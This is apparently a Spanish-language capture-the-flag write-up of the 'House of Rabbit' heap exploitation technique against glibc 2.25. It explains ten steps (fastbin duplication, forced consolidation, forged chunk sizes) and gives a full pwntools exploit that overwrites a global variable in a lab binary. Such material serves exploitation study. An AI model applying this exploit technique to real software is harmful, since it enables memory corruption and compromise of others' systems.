# House Of Rabbit

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'../.glibc/glibc_2.25'
    Stripped:   No
    Debuginfo:  Yes
```

Si existe la posibilidad de obtener una shell en este reto la desconozco. El objetivo de este reto fue sobreescribir la variable global `target`.

Podemos reservar hasta 9 chunks de tamaño arbitrario (4 de ellos fastchunks). Podemos usar un fastbin duplication y luego con la tecnica homonima conseguir nuestro objetivo.

Pasos:
1. `user` sera nuestro fake_chunk, asi que `user.age` sera fake_chunk->size, podemos hacer `user.age=3`.
2. Hacemos `av->system_mem` (la memoria disponible en el heap) lo suficientemente grande, haciendo malloc->free, malloc->free a un chunk con size=0xa00000 por ejemplo.
3. Implementamos una duplicacion en la fastbin con `malloc(n<=0x80)` -> `malloc(n<=0x80)` -> `free(fast1)` -> `free(fast2)` -> `free(fast1)`.
4. Reservamos otro chunk con `malloc(n)` (apunta al chunk fast1) y editamos su campo fd para introducir la direccion de nuestro fake_chunk. Ahora nuestro fake_chunk esta en la fastbin.
5. Reservamos un chunk "small" con `malloc(m > 0x80)` y lo liberamos.
```
 Al liberar este chunk adyacente al top chunk se llama a free(sizeof(chunk) + sizeof(top_chunk)),
 un tamaño mayor a  FASTBIN_CONSOLIDATION_THRESHOLD (0x10000 por defecto), por lo que se llama a
 malloc_consolidate que almacena nuestro fake_chunk en unsortedbin porque este no es adyacente al
 top chunk. El resto de chunks de la fastbin son desechados.
```
6. Cambiamos fake_chunk->size a un valor mayor o igual que 0x80000.
7. Hacemos una peticion grande, por ejemplo: `malloc(0xa00000)`.
```
 Esta peticion que excede el tamaño de lo que hay en unsortedbin y el esperado por las smallbins
 mueve el chunk de unsortedbin a la largebin del tamaño correspondiente. En este caso es bin[126],
 la mayor de las largebins, que almacena chunks de tamaño ilimitado.
```
8. Cambiamos fake_chunk->size a un valor grande como `0xfffffffffffffff1` (prev_inuse activo).
9. Hacemos un `malloc(&target - &fake_chunk - 0x20)`.
```
 Esto nos da un chunk enorme y luego el chunk con el tamaño restante se mueve a la unsortedbin.
 Este chunk en la unsorted bin se encuentra en nuestra direccion objetivo asi que el proximo
 malloc de tamaño similar al restante devolvera un chunk en esta direccion.
```
10. Reservamos un chunk con `malloc(n)` tal que n <= remainder_size: 0x10.

```py
#!/usr/bin/python3
from pwn import *

io = process("./house_of_rabbit")
libc = ELF("../.glibc/glibc_2.25/libc.so.6",checksec=False)

index = 0

def malloc(size, data):
    global index
    io.sendline(b"1")
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendlineafter(b"data: ", data)
    index += 1
    return index - 1

def free(index):
    io.sendline(b"2")
    io.sendlineafter(b"index: ", str(index).encode())

def amend_age(age):
    io.sendline(b"3")
    io.sendlineafter(b"age: ", str(age).encode())

io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.symbols['puts']

# "age" is going to be fake_chunk->size
io.sendafter(b"age: ",str(3).encode())

# Make av->system_mem value = 0xa21000
small = malloc(0xa00000,b"")
free(small)
small = malloc(0xa00000,b"")
free(small)

# Fastbin duplication
fast1 = malloc(0x40,b"")
fast2 = malloc(0x40,b"")

free(fast1)
free(fast2)
free(fast1)

# Put fake_chunk in the fastbin
fast1 = malloc(0x40,p64(0x602040))

small = malloc(0x100,b"")

# free(small) triggers malloc_consolidate when merging with top chunk
free(small)

# for the fake chunk is it true that nextchunk != av->top, then is added to the unsortedbin in the last free

# Change fake_chunk->size to fit in the largest largebin (bin[126])
amend_age(0x80001)

# Another big request moves the fake chunk to the largest largebin
small = malloc(0xa00000,b"")

# Change fake_chunk->size to a big one
amend_age(0xfffffffffffffff1)

# Move target to the the unsortedbin
# remainder chunk size is 0xfffffffffffffff0 - 0x10 - 0xffffffffffffffb0 = 0x30
malloc(0x602010 - 0x602040 - 0x20, b"")

# Alloc target
hook = malloc(0x20,b"_s1s1fo_\00")

io.recv(1024)
io.sendline(b"4")

io.interactive()
```

